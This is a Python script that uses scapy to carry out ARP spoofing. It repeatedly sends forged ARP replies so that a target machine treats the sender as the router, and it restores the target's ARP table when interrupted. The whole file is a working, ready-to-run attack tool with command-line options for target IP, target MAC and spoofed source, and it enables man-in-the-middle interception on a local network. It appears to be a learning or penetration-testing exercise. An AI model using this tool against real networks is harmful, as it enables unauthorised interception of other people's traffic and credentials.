import scapy.all as scapy
import optparse
import ipaddress
import macaddress
import time
import sys
import signal

'''
>>> scapy.ls(scapy.ARP())
hwtype     : XShortField                         = 1               (1)
ptype      : XShortEnumField                     = 2048            (2048)
hwlen      : FieldLenField                       = None            (None)
plen       : FieldLenField                       = None            (None)
op         : ShortEnumField                      = 1               (1)
hwsrc      : MultipleTypeField                   = '00:0c:29:1d:20:8f' (None)
psrc       : MultipleTypeField                   = '192.168.1.77'  (None)
hwdst      : MultipleTypeField                   = '00:00:00:00:00:00' (None)
pdst       : MultipleTypeField                   = '0.0.0.0'       (None)
>>> scapy.ls(scapy.Ether())
dst        : DestMACField                        = 'ff:ff:ff:ff:ff:ff' (None)
src        : SourceMACField                      = '00:0c:29:1d:20:8f' (None)
type 
'''

def get_arguments():
    options = parser.parse_args()[0]
    return options.address_t, options.mac, options.address_s, options.restore_mac

def spoof(address_t, mac, address_s):
    # Create the packet that will perform the ARP spoof
    # NOTE: We don't need to specify the source mac, because we want the target to believe we're the router
    packet = scapy.ARP(op=2, pdst=address_t, hwdst=mac, psrc=address_s)
    scapy.send(packet, verbose=False)

def signal_handler(sig, frame):
    global address_t, address_s, mac, restore_mac
    print("Signal detected: {}".format(sig))
    # Gracefully shutdown if CTRL+C
    if int(sig) == 2:
        print("[-] ARP Spoofing stopped. Restoring arp tables...")
        packet = scapy.ARP(op=2, pdst=address_t, hwdst=mac, psrc=address_s, hwsrc=restore_mac)
        scapy.send(packet, verbose=False)
        sys.exit(0)

# Constants
HELP_ADDR_T = "The ip address of the target machine."
HELP_MAC_T = "The mac address of the target machine."
HELP_ADDR_S = "The ip address to use as the source address."
HELP_MAC_S = "The mac address to restore the ARP tables (i.e., the source IP's MAC)"

parser = optparse.OptionParser()
parser.add_option("-a", "--address", dest="address_t", help=HELP_ADDR_T)
parser.add_option("-m", "--mac", dest="mac", help=HELP_MAC_T)
parser.add_option("-s", "--source", dest="address_s", help=HELP_ADDR_S)
parser.add_option("-r", "--restore", dest="restore_mac", help=HELP_MAC_S)

address_t, mac, address_s, restore_mac = get_arguments()

signal.signal(signal.SIGINT, signal_handler)
pckt_count = 1
print("ARP Spoof as {} | Target IP: {} | Target MAC: {}".format(address_s, address_t, mac))
while True:
    spoof(address_t, mac, address_s)
    time.sleep(2)
    print("\r [+] Total {} packets sent.".format(str(pckt_count)), end="")
    pckt_count += 1
